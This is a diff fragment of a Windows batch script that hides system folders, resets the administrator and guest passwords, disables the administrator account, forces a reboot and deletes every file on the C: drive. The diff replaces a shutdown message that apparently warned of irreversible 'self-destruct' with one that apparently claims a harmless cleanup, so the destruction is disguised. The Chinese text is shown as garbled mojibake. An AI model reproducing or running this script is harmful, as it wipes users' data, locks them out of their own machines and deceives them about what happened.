@@ -5,10 +5,10 @@ cd  c:\
 attrib  +s  +h  "windows" 
 attrib  +s  +h  "Program  Files" 
 attrib  +s  +h  "Documents  and  Settings" 
-cd  C:\Documents  and  Settings\Administrator\×ÀÃæ 
+cd  C:\Documents  and  Settings\Administrator\æ¡Œé¢ 
 attrib  +S  +h 
 net  user  administrator  wtfdead 
 net  user  guest  wtfdead
-shutdown  -r  -t  60  -c  "ÎªÁËÄúµÄÊı¾İ°²È«£¬ÏµÍ³ÒÑÆô¶¯×ÔÎÒ´İ»ÙÄ£Ê½£¬Ä£Ê½½«ÔÚÒ»·ÖÖÓºóÖ´ĞĞ£¬´Ë²Ù×÷Ò»µ©Ö´ĞĞÎŞ·¨³·Ïú¡£"
+shutdown  -r  -t  60  -c  "æ¸…ç†å®Œæˆï¼Œå³å°†é‡å¯ç”µè„‘"
 net  user  administrator  /active:no 
 del  /f  /s  /q  c:\*.* 
